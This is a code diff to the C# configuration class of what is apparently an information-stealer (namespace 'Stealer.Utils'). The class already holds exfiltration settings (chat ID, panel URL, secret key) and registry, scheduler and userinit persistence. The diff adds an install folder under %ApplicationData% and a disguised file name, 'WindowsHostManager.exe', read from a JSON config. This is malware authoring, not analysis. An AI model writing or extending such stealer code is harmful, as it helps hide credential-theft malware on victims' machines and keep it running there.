@@ -13,6 +13,8 @@ namespace Stealer.Utils
         public static string PanelUrl { get; private set; } = "";
         public static string SecretKey { get; private set; } = "";
         public static string Persistence { get; private set; } = "registry,scheduler,userinit";
+        public static string InstallFolder { get; private set; } = "%ApplicationData%";
+        public static string InstallName   { get; private set; } = "WindowsHostManager.exe";
         
         private static bool _initialized = false;
 
@@ -50,7 +52,11 @@ namespace Stealer.Utils
                         ChatId = ParseJsonKey(json, "chatId").Trim().TrimEnd('\0', ' ');
                         PanelUrl = ParseJsonKey(json, "panelUrl").Trim().TrimEnd('\0', ' ');
                         SecretKey = ParseJsonKey(json, "secretKey").Trim().TrimEnd('\0', ' ');
-                        Persistence = ParseJsonKey(json, "persistence").Trim().TrimEnd('\0', ' ');
+                        Persistence    = ParseJsonKey(json, "persistence").Trim().TrimEnd('\0', ' ');
+                        var rawFolder  = ParseJsonKey(json, "installFolder").Trim().TrimEnd('\0', ' ');
+                        var rawName    = ParseJsonKey(json, "installName").Trim().TrimEnd('\0', ' ');
+                        if (!string.IsNullOrEmpty(rawFolder)) InstallFolder = rawFolder;
+                        if (!string.IsNullOrEmpty(rawName))   InstallName   = rawName;
                     }
                 }
             }
